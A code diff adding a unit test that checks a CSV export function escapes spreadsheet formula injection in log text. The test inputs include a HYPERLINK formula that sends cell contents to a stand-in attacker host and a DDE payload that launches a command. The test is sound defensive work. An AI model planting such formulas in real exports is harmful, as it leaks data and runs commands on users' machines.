@@ -68,6 +68,20 @@ describe('insights + export on the sample', () => {
     expect(counts.reduce((a, b) => a + b, 0)).toBe(16);
   });
 
+  it('keeps spreadsheet formulas from log text as text in CSV', () => {
+    expect(csvEscape('=HYPERLINK("https://evil.example/?d="&A1,"x")')).toBe(`"'=HYPERLINK(""https://evil.example/?d=""&A1,""x"")"`);
+    expect(csvEscape("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
+    expect(csvEscape('-2+3')).toBe("'-2+3");
+    expect(csvEscape('@SUM(1)')).toBe("'@SUM(1)");
+    expect(csvEscape('\t=1')).toBe("'\t=1");
+    // Not formulas: numbers and the IIS empty-field marker stay as they are.
+    expect(csvEscape(-5)).toBe('-5');
+    expect(csvEscape('-12.5')).toBe('-12.5');
+    expect(csvEscape('+1')).toBe('+1');
+    expect(csvEscape('-')).toBe('-');
+    expect(csvEscape('Mozilla/5.0')).toBe('Mozilla/5.0');
+  });
+
   it('exports CSV with quoting and JSON', () => {
     expect(csvEscape('a,b')).toBe('"a,b"');
     expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
